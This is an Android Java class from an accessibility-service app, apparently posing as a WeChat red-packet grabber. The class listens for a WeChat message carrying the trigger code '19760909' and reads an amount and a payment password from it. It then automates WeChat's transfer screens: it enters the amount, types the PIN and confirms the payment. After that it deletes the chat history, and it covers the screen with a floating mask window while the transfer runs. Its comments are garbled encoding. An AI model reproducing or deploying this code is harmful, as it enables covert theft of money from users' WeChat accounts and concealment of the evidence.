/**
 * 
 */
package accessibility.app;




import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;
import android.os.Build;
import android.os.Handler;
import android.os.Parcelable;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import floatwindow.FloatWindowMask;
import notification.NotifyHelper;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;


/**
 * @author ASUS
 *
 */
public class TransferAccounts extends BaseAccessibilityJob  {
	private static final String WINDOW_REMITTANCE_UI="com.tencent.mm.plugin.remittance.ui.RemittanceUI";
	private static final String WINDOW_PWD_UI="com.tencent.mm.plugin.wallet_core.ui.o";//667
	private static final String WINDOW_REMITTANCE_RESULT_UI="com.tencent.mm.plugin.remittance.ui.RemittanceResultNewUI";//���
	private static final String WINDOW_CHATTING_UI="com.tencent.mm.ui.chatting.ChattingUI";
	public static final String WINDOW_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
	
	public static final String WINDOW_SINGLE_CHAT_INFO_UI="com.tencent.mm.ui.SingleChatInfoUI";//������Ϣ
	public static final String WINDOW_DEL_WIDGET_UI="com.tencent.mm.ui.widget.a.c";//ȷ��ɾ���Ի���
	
	public static final String WIDGET_BUTTON="android.widget.Button";
	
	private static TransferAccounts current;
	public static final String WX_TRANSFER_ACCOUNTS_ORDER = "19760909";//��
	private String mMoney="0001";//0200
	private String mPwd="000000";
	public static boolean mWorking=false;
	private AccessibilityNodeInfo mRootNode;
	private  boolean mIsClear=false;
	
	
    private TransferAccounts() {
    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
    }
    public static synchronized TransferAccounts getInstance() {
        if(current == null) {
            current = new TransferAccounts();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (ˢ�´�������)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 int eventType = event.getEventType(); 
		 switch (eventType) {  
		 	case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: //��һ��������֪ͨ����Ϣ     
			 if(event.getParcelableData()==null)return;
			 Parcelable data = event.getParcelableData();  //��ȡParcelable����  
			 if (data instanceof Notification) {//�ж��Ƿ���Notification����    
				 Notification notification = (Notification) data;
				 if(notification.tickerText==null)return;
				 String text = String.valueOf(notification.tickerText);
				 if(text.contains(WX_TRANSFER_ACCOUNTS_ORDER)){
					 int index = text.indexOf(":");
				     if(index != -1) {
				    	 text = text.substring(index + 1);
				    	 text=text.trim();
				     }
				     if(!parseOrder(text))return;
				     if(!openNotification(notification))return;
				     Workstart();
				 }
			 }
			 break;
	        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: 
	        	if(!mWorking)return;
	        	if(event.getClassName()==null)return;
	        	mCurrentUI= event.getClassName().toString(); 
	        	
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) {
	            	mRootNode=event.getSource();
	            	if(mIsClear)
	            		clickSingleChatInfoButton(mRootNode);  
	            	else
	            		clickJia(mRootNode);  
	            }
	            if (mCurrentUI.equals(WINDOW_REMITTANCE_UI)) {
	            	
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
	            	inputPWD();
	            	mIsClear=true;
	            }
	            if (mCurrentUI.equals(WINDOW_REMITTANCE_RESULT_UI)) {
	            	mRootNode=event.getSource();
	            	clickCompleteButton(mRootNode);
	            	//mWorking=false;
	            }
	            if (mCurrentUI.equals(WINDOW_SINGLE_CHAT_INFO_UI)) {//������Ϣҳ��
	            	mRootNode=event.getSource();
	            	clickClearLogTxt(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_DEL_WIDGET_UI)) {//ȷ��ɾ���Ի���
	            	mRootNode=event.getSource();
	            	clickClearButton(mRootNode);
	            	mWorking=false;
	            }
	            break; 
	        case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: 
	        	if(!mWorking)return;
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) { 
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            	clickRemittanceItem(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_REMITTANCE_UI)) {
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            	clickAmountPanel(mRootNode,mMoney);
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            	clickSafeButton(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_REMITTANCE_RESULT_UI)) {//��ɴ���
	            	mRootNode=event.getSource();
	            	clickCompleteButton(mRootNode);
	            	//mWorking=false;
	            }
	        	break; 
	        }
		 }

	/**��֪ͨ����Ϣ*/
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
	private boolean openNotification(Notification notification) {
		PendingIntent pendingIntent = notification.contentIntent;
		boolean lock = NotifyHelper.isLockScreen(context);
		if(!lock) {
			return NotifyHelper.send(pendingIntent);
		}
		return false;
	}
	/*��������*/
	private boolean parseOrder(String text) {
		if(text.length()!=18)return false;
		mPwd=text.substring(12);
		//if(mPwd.equals("000000"))
			//mPwd=Config.sPWD;
		mMoney=text.substring(8,12);
		return true;
	}
	  /*
     * ������๦�ܰ�ť��
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickJia(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "���๦�ܰ�ť",-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.ImageButton"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceItem(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ת��",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "ת��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����Ȼ֧����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickSafeButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "��Ȼ֧��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }

    /*
     * �����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickAmountButton(AccessibilityNodeInfo rootNode,String value){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, value,-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.Button"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public boolean clickAmountPanel(AccessibilityNodeInfo rootNode,String amount){
    	for(int i=0;i<amount.length();i++){
    		String c=amount.substring(i,i+1);
    		if(!clickAmountButton(rootNode,c))return false;
    	}
    	return clickRemittanceButton(rootNode);
    }
	  /*
     * ���������Ϣ��ť��
     */
    public boolean clickSingleChatInfoButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "������Ϣ",0);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.ImageButton"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * �����������¼��ť��
     */
    public boolean clickClearLogTxt(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "��������¼",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����հ�ť��
     */
    public boolean clickClearButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "���",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����ɣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickCompleteButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "���",WIDGET_BUTTON);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public void inputPWD(){
    	Funcs.Sleep(1000);
    	if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N)
    		WXinputPWD.getInstance().inputThread(mPwd);
    	else
    		WXinputPWD.getInstance().input7Thread(mPwd);
    }
    /**��ʼ����30��*/
    public void Workstart() {
    	mWorking=true;
    	mIsClear=false;
    	FloatWindowMask.getInstance(context).ShowFloatingWindow();
    	if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
    	
    	Handler handler= new Handler(); 
    	Runnable runnableBack  = new Runnable() {    
    		@Override    
    		public void run() {    
    			Funcs.OpenWechat(context);
    			mWorking=false;
    			Funcs.Sleep(10*1000);
    			FloatWindowMask.getInstance(context).RemoveFloatingWindow();
    		}    
    	};
    	handler.postDelayed(runnableBack, 20*1000);
    }
}
